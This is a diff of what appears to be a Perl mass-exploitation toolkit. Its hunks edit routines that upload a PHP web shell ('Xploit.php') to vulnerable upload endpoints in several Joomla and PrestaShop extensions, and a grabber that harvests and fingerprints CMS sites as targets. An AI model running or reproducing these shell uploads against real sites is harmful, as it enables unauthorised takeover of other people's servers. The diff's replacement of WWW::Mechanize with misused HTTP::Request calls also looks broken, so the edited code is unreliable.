@@ -14,7 +14,7 @@ use HTTP::Response;
 use HTTP::Request;
 use HTTP::Request::Common qw(POST);
 use HTTP::Request::Common qw(GET);
-use WWW::Mechanize;
+use HTTP::Headers;
 use URI::URL;
 use IO::Select;
 use IO::Socket::INET;
@@ -4119,12 +4119,11 @@ print color('bold red'),"NOT VULN\n";
 ################ fieldvmegamenu #####################
 sub fieldvmegamenu(){
 my $url = "$site/modules/fieldvmegamenu/ajax/upload.php";
-my $shell ="Xploit.php";
 my $field_name = "images[]";
 
 my $response = $ua->post( $url,
             Content_Type => 'multipart/form-data',
-            Content => [ $field_name => ["$shell"] ]
+            Content => [ $field_name => ["Xploit.php"] ]
 
             );
 $fieldvmegamenuup="$site/modules/fieldvmegamenu/uploads/Xploit.php";
@@ -5788,11 +5787,9 @@ print color('bold red'),"NOT VULN\n";
 ################ comfabrik2 #####################
 sub comfabrik2(){
 my $url = "$site/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload";
-my $shell ="Xploit.php";
-
 my $response = $ua->post( $url,
             Content_Type => 'form-data',
-            Content => ["file" => ["$shell"]]
+            Content => ["file" => ["Xploit.php"]]
 
             );
 
@@ -6103,7 +6100,7 @@ if($checkpofxwup =~/X Xploit/) {
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"rokdownloads";
-print color('bold white')," ....................... ";
+print color('bold white')," ...................... ";
 print color('bold green'),"Done\n";
 print color('red')," * ";
 print color('reset');
@@ -6196,10 +6193,7 @@ print color('red'),"NOT VULN\n";
 ################ Proclaim 9.1.1 #####################
 sub Proclaim(){
 my $url = "$site/index.php?option=com_biblestudy&view=mediafileform&layout=edit&id=1";
-
-my $shell ="Xploit.php";
-
-my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);
+my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["Xploit.php"] ]);
 
 $Proclaims="$site/images/biblestudy/media/Xploit.php";
 my $checkfoxup = $ua->get("$Proclaims")->content;
@@ -6313,10 +6307,7 @@ print color('red'),"NOT VULN\n";
 ################ com_osproperty 2.0.2 #####################
 sub osproperty(){
 my $url = "$site/osproperty/?task=agent_register";
-
-my $shell ="Xploit.php";
-
-my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);
+my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["Xploit.php"] ]);
 
 $ospropertys="$site/images/osproperty/agent/Xploit.php";
 
@@ -6372,10 +6363,7 @@ print color('red'),"NOT VULN\n";
 ################ com_hwdvideoshare #####################
 sub hwdvideoshare(){
 my $url = "$site/com_hwdvideoshare/assets/uploads/flash/flash_upload.php?jqUploader=1";
-
-my $shell ="Xploit.php";
-
-my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);
+my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["Xploit.php"] ]);
 
 $hwdvideoshares="$site/tmp/Xploit.php";
 
@@ -6403,10 +6391,7 @@ print color('red'),"NOT VULN\n";
 ################ mod_jfancy #####################
 sub fancys(){
 my $url = "$site/modules/mod_jfancy/script.php";
-
-my $shell ="Xploit.php";
-
-my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);
+my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["Xploit.php"] ]);
 
 $fancyss="$site/images/Xploit.php";
 
@@ -8897,7 +8882,7 @@ exit
 ###############################################################################################
 sub websitegrabber(){
 my $datetime  = localtime();
-$mech = WWW::Mechanize->new(autocheck => 0);
+$request = HTTP::Request->new(autocheck => 0);
 $ag = LWP::UserAgent->new();
 $ag->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
 $ag->timeout(10);
@@ -8937,12 +8922,12 @@ print color("green"),$logo;
 print colored ("                       Start At $datetime                                      ",'white on_black'),"\n";
 print color("green" ), "\t[";print color("red"),"1";print color("green"),"]";print color("blue"),"Mass Grab by ip or site list \n";
 print color("green" ), "\t[";print color("red"),"2";print color("green"),"]";print color("red"),"Mass Grab Range by ip or site list \n";
-print color("green" ), "\t[";print color("red"),"3";print color("green"),"]";print color("green"),"choose ur country u want it \n";
-print color("green" ), "\t[";print color("red"),"4";print color("green"),"]";print color("yellow"),"find sites in all COUNTRY domain \n";
-print color("green" ), "\t[";print color("red"),"5";print color("green"),"]";print color("blue"),"find sites in all WORK domainS \n";
-print color("green" ), "\t[";print color("red"),"6";print color("green"),"]";print color("red"),"find sites in ALL domainS \n";
-print color("green" ), "\t[";print color("red"),"7";print color("green"),"]";print color("green"),"extract sites from ip server \n";
-print color("green" ), "\t[";print color("red"),"0";print color("green"),"]";print color("red"),"GO_BACK <-- \n\n\n";
+print color("green" ), "\t[";print color("red"),"3";print color("green"),"]";print color("green"),"Choose ur country u want it \n";
+print color("green" ), "\t[";print color("red"),"4";print color("green"),"]";print color("yellow"),"Find sites in all COUNTRY domain \n";
+print color("green" ), "\t[";print color("red"),"5";print color("green"),"]";print color("blue"),"Find sites in all WORK domainS \n";
+print color("green" ), "\t[";print color("red"),"6";print color("green"),"]";print color("red"),"Find sites in ALL domainS \n";
+print color("green" ), "\t[";print color("red"),"7";print color("green"),"]";print color("green"),"Extract sites from ip server \n";
+print color("green" ), "\t[";print color("red"),"0";print color("green"),"]";print color("red"),"BACK <-- \n\n\n";
 print color("green"),"[+] Choose Number : ";
 my $toolZ = <STDIN>;
 chomp $toolZ;
@@ -9271,8 +9256,6 @@ $rrs = $resp->content;
 
 while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){
 
-
-
 $link = $1;
 	if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
 	{
@@ -9333,7 +9316,7 @@ if($link !~ /\"|\?|\=|index\.php/){
 					if  (!  grep (/$link/,@result))
 					{
 print "$link\n";
-open(save, '>>target/sites-1.txt');
+open(save, '>>Extract/sites-1.txt');
     print save "$link\n";
     close(save);
 						push(@result,$link);
@@ -9346,7 +9329,7 @@ if ($rrs !~ m/class=\"sb_pagN\"/g){
 next OUTER;
 }
 }
-	print "saved at target/sites-1.txt";
+	print "saved at Extract/sites-1.txt";
 
 }
 
@@ -9381,12 +9364,12 @@ $logo="
 
 ";
 print color("green"),$logo;
-print color("green" ), "\t   [";print color("red"),"1";print color("green"),"]extract WORDPRESS sites ^^\n";
-print color("green" ), "\t   [";print color("red"),"2";print color("green"),"]extract JOOMLA sites ^^\n";
-print color("green" ), "\t   [";print color("red"),"3";print color("green"),"]extract DRUPAL sites ^^\n";
-print color("green" ), "\t   [";print color("red"),"4";print color("green"),"]extract VBULLETIN sites ^^\n";
-print color("green" ), "\t   [";print color("red"),"5";print color("green"),"]extract ALL the server sites ^^\n";
-print color("green" ), "\t   [";print color("red"),"6";print color("green"),"]GO_BACK \n";
+print color("green" ), "[";print color("red"),"1";print color("green"),"]extract WORDPRESS sites ^^\n";
+print color("green" ), "[";print color("red"),"2";print color("yellow"),"]extract JOOMLA sites ^^\n";
+print color("green" ), "[";print color("red"),"3";print color("red"),"]extract DRUPAL sites ^^\n";
+print color("green" ), "[";print color("red"),"4";print color("blue"),"]extract VBULLETIN sites ^^\n";
+print color("green" ), "[";print color("red"),"5";print color("cyan"),"]extract ALL the server sites ^^\n";
+print color("green" ), "[";print color("red"),"6";print color("green"),"]BACK \n";
 print color("green"),"[+] Choose Number : ";
 	$choice1 = <stdin>;
 	chomp ($choice1);
@@ -9625,8 +9608,8 @@ sub Joomla15
 {
         foreach $site (@result)
         {
-                $mech->get("$site");
-                $Scont = $mech->content;
+                $request->get("$site");
+                $Scont = $request->content;
                 if ($Scont =~ m/<meta name="generator" content="Joomla! 1.5 - Open Source Content Management" \/>/ig)
                 {
                         push @JM,$site;
@@ -9635,8 +9618,8 @@ sub Joomla15
                 else
                 {
                         $admin = "$site/administrator/";
-                        $mech->get("$site");
-                        $AdminCont = $mech->content;
+                        $request->get("$site");
+                        $AdminCont = $request->content;
                         if ($AdminCont =~ m/<meta name="generator" content="Joomla! 1.5 - Open Source Content Management" \/>/ig)
                         {
                                 push @JM,$site;
@@ -9656,8 +9639,8 @@ sub Joomla
 	{
 		if  (!  grep (/$site/,@WPS))
 		{
-			$url = $mech->get("$site");
-			$Scont = $mech->content;
+			$url = $request->get("$site");
+			$Scont = $request->content;
 			if ($Scont =~ m/<meta name="generator" content="Joomla!/ig)
 			{
 				push @JM,$site;
@@ -9666,8 +9649,8 @@ sub Joomla
 			else
 			{
 				$admin = "$site/administrator/";
-				$mech->get("$site");
-				$AdminCont = $mech->content;
+				$request->get("$site");
+				$AdminCont = $request->content;
 				if ($AdminCont =~ m/<meta name="generator" content="Joomla!/ig)
 				{
 					push @JM,$site;
@@ -9686,8 +9669,8 @@ sub DRV
 {
         foreach $site (@result)
         {
-                $mech->get("$site");
-                $Scont = $mech->content;
+                $request->get("$site");
+                $Scont = $request->content;
                 if ($Scont =~ m/<meta name="Generator" content="Drupal $ver/ig)
                 {
                         push @DS,$site;
@@ -9707,8 +9690,8 @@ sub searchdrupal
 	{
 		if  (!  grep (/$site/,@WPS) and ! grep(/$site/,@JM))
 		{
-			$mech->get("$site");
-			$Scont = $mech->content;
+			$request->get("$site");
+			$Scont = $request->content;
 			if ($Scont =~ m/<meta name="Generator" content="Drupal/ig)
 			{
 				push @DS,$site;
@@ -9725,17 +9708,17 @@ sub searchdrupal
 sub WPS {
 	foreach $site (@result)
 	{
-		$url = $mech->get("$site");
-		$Scont = $mech->content;
+		$url = $request->get("$site");
+		$Scont = $request->content;
 		if ($Scont =~ m/wp-content/g)
 		{
 			$license = $site."license.txt";
-			$horse = $mech->get("$license");
+			$horse = $request->get("$license");
 			if ($horse->is_success)
 			{
-				$Scont = $mech->content;
+				$Scont = $request->content;
 				$login = $site."wp-login.php";
-				$logUrl = $mech->get("$login");
+				$logUrl = $request->get("$login");
 	 	                if ($Scont =~ m/WordPress/)
 				{
 					push @WPS,$site;
